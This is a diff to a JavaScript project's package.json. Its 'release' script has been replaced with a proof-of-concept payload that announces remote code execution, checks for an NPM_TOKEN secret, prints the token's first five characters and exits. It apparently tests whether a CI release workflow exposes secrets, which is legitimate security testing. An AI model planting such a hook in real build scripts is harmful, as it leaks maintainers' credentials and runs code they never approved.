@@ -31,7 +31,7 @@
     "start": "concurrently \"yarn watch\" \"cd examples && yarn && yarn start\"",
     "build": "yarn build:production",
     "watch": "yarn build:development --watch",
-    "release": "echo '>>> PoC RCE: Malicious script is executing <<<' && if [ -n \"$NPM_TOKEN\" ]; then echo '>>> VULNERABLE: The first 5 chars of the NPM_TOKEN are: ${{NPM_TOKEN:0:5}} <<<'; else echo '>>> NOT VULNERABLE: The NPM_TOKEN is not set. <<<'; fi && exit 1",
+    "release": "echo '>>> PoC RCE: Malicious script is executing <<<' && if [ -n \"$NPM_TOKEN\" ]; then echo '>>> VULNERABLE!: The first 5 chars of the NPM_TOKEN are: ${{NPM_TOKEN:0:5}} <<<'; else echo '>>> NOT VULNERABLE: The NPM_TOKEN is not set. <<<'; fi && exit 1",
     "lint": "eslint ./src ./test --max-warnings 0",
     "type-check": "tsc -b",
     "esdoc": "esdoc -c esdoc.json",
